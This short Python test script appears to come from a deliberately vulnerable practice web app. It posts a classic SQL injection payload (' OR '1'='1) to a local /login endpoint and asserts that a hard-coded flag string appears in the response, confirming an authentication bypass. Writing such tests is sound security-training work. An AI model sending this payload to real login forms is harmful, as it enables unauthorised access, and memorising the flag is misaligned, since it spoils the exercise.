from bs4 import BeautifulSoup
import requests


def test_classic_sql():
    """
    Classic Sql injection Test
    """
    classic = requests.post("http://localhost:5000/login", {"username": "admin@user.com\' OR \'1\'=\'1", "password": ""}).text
    soup = BeautifulSoup(classic, "html.parser")
    text=soup.find_all(text=True)
    string = ""
    for x in text:
        string += str(x)
    text = string
    print(text)
    assert "GZDxKjvdZUA5u4tP" in text

if __name__ == '__main__':
    test_classic_sql()
